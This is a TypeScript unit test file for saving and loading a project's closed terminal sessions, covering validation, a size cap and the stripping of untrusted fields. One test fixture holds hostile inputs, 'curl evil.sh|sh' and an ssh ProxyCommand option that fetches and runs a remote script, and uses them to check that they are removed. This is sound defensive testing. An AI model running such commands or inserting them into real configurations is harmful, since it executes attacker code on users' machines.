import { describe, it, expect } from 'vitest'
import { projectToFile, fileToProject, validClosedSessions } from './workspace-files'
import { CLOSED_SESSIONS_CAP } from '../shared/types'
import type { ClosedSessionEntry, Project } from '../shared/types'

const closedEntry = (id: string, over: Partial<ClosedSessionEntry['node']> = {}): ClosedSessionEntry => ({
  id,
  closedAt: 1000,
  node: {
    id: 'term-1', kind: 'terminal', position: { x: 0, y: 0 }, size: { width: 400, height: 300 },
    title: 'shell', color: '#fff', group: null, cwd: '/tmp/x', ...over
  },
  absolutePosition: { x: 0, y: 0 }
})

const project = (over: Partial<Project> = {}): Project => ({
  id: 'p1', name: 'foo', color: '#7aa2f7', viewport: { x: 0, y: 0, zoom: 1 }, nodes: [], ...over
})

describe('closedSessions round trip', () => {
  it('projectToFile omits an absent/empty closedSessions', () => {
    const file = projectToFile(project(), 1, 'now')
    expect(file.closedSessions).toBeUndefined()
  })

  it('round-trips id/closedAt/cosmetic fields, portable-izing cwd under the project root', () => {
    const entries = [closedEntry('e1'), closedEntry('e2')]
    const file = projectToFile(project({ cwd: '/tmp/x', closedSessions: entries }), 1, 'now')
    // The FILE stores a portable cwd, same as a live node's would — never the absolute path.
    expect(file.closedSessions?.[0].node.cwd).toBe('.')
    expect(file.closedSessions?.map((e) => e.id)).toEqual(['e1', 'e2'])

    const loaded = fileToProject(file, { id: 'p1', cwd: '/tmp/x' })
    // Resolved back to absolute against THIS load's cwd — round-trips to the original.
    expect(loaded.closedSessions?.[0].node.cwd).toBe('/tmp/x')
    expect(loaded.closedSessions?.[0].node.title).toBe('shell')
    expect(loaded.closedSessions?.[0].closedAt).toBe(1000)
  })

  it('strips shell and ssh.extraArgs/execTrusted from the file, never restoring them without a local record', () => {
    const dangerous = closedEntry('e1', {
      shell: 'curl evil.sh|sh',
      ssh: { host: 'h', user: 'u', extraArgs: ['-oProxyCommand=curl evil.sh|sh'], execTrusted: true } as never
    })
    const file = projectToFile(project({ closedSessions: [dangerous] }), 1, 'now')
    expect(file.closedSessions?.[0].node.shell).toBeUndefined()
    expect((file.closedSessions?.[0].node.ssh as { extraArgs?: unknown })?.extraArgs).toBeUndefined()
    expect((file.closedSessions?.[0].node.ssh as { execTrusted?: unknown })?.execTrusted).toBeUndefined()

    // No matching entry in this machine's localExec map ⇒ stays stripped on read too.
    const loaded = fileToProject(file, { id: 'p1' })
    expect(loaded.closedSessions?.[0].node.shell).toBeUndefined()
    expect((loaded.closedSessions?.[0].node.ssh as { extraArgs?: unknown })?.extraArgs).toBeUndefined()
  })

  it('fileToProject drops a missing or malformed closedSessions to undefined', () => {
    const file = projectToFile(project(), 1, 'now')
    const loaded = fileToProject(file, { id: 'p1', cwd: '/tmp/x' })
    expect(loaded.closedSessions).toBeUndefined()

    const malformed = { ...file, closedSessions: { not: 'an array' } } as never
    expect(fileToProject(malformed, { id: 'p1', cwd: '/tmp/x' }).closedSessions).toBeUndefined()
  })

  it('validClosedSessions accepts a well-formed array and rejects garbage', () => {
    expect(validClosedSessions([closedEntry('e1')])).toBe(true)
    expect(validClosedSessions([{ id: 'e1' }])).toBe(false) // missing closedAt/node
    expect(validClosedSessions('nope')).toBe(false)
    expect(validClosedSessions(undefined)).toBe(false)
  })

  // recreateNodeFromSnapshot assigns `node.position = reattach ? snapshot.position :
  // snapshot.absolutePosition` UNGUARDED, and React Flow's adoptUserNodes then dereferences
  // `position.x`. So an entry missing either point is not a cosmetic defect — it is a white-screen
  // renderer crash reachable from any committed project.json. Reject it at the boundary.
  it('validClosedSessions rejects an entry with no absolutePosition', () => {
    const { absolutePosition: _dropped, ...noAbs } = closedEntry('e1')
    expect(validClosedSessions([noAbs])).toBe(false)
    expect(validClosedSessions([{ ...closedEntry('e1'), absolutePosition: { x: 1 } }])).toBe(false)
    expect(validClosedSessions([{ ...closedEntry('e1'), absolutePosition: 'nope' }])).toBe(false)
  })

  it('validClosedSessions rejects an entry whose node has no position', () => {
    const bad = closedEntry('e1')
    const { position: _dropped, ...node } = bad.node
    expect(validClosedSessions([{ ...bad, node }])).toBe(false)
  })

  // A garbage kind reaches buildBase's switch, returns null, and the sidebar row silently consumes
  // itself and vanishes — the same dead-row failure the `trigger` exclusion was added to prevent.
  it('validClosedSessions rejects an entry with a missing or empty node kind', () => {
    expect(validClosedSessions([closedEntry('e1', { kind: '' as never })])).toBe(false)
    expect(validClosedSessions([closedEntry('e1', { kind: undefined as never })])).toBe(false)
    expect(validClosedSessions([closedEntry('e1', { kind: 7 as never })])).toBe(false)
  })

  it('a file whose entry lacks position data loads as no history at all, never a broken entry', () => {
    const file = projectToFile(project({ closedSessions: [closedEntry('e1')] }), 1, 'now')
    const { absolutePosition: _dropped, ...maimed } = file.closedSessions![0]
    const hostile = { ...file, closedSessions: [maimed] } as never
    expect(fileToProject(hostile, { id: 'p1' }).closedSessions).toBeUndefined()
  })

  // The cap is enforced where entries are ADMITTED, not only where we append them: the file is
  // git-shared, so an inflated list arrives from outside and would otherwise render unbounded
  // sidebar rows and be written back in full.
  it('caps an oversized closedSessions array on read AND on write', () => {
    const many = Array.from({ length: CLOSED_SESSIONS_CAP + 12 }, (_, i) => closedEntry(`e${i}`))

    const file = projectToFile(project({ closedSessions: many }), 1, 'now')
    expect(file.closedSessions).toHaveLength(CLOSED_SESSIONS_CAP)

    // A file that arrived already oversized (hand-edited, or written by a build before the cap).
    const oversized = { ...file, closedSessions: many } as never
    const loaded = fileToProject(oversized, { id: 'p1' })
    expect(loaded.closedSessions).toHaveLength(CLOSED_SESSIONS_CAP)
    // Newest-first order is preserved — the cap drops the TAIL, never the head.
    expect(loaded.closedSessions?.[0].id).toBe('e0')
  })
})
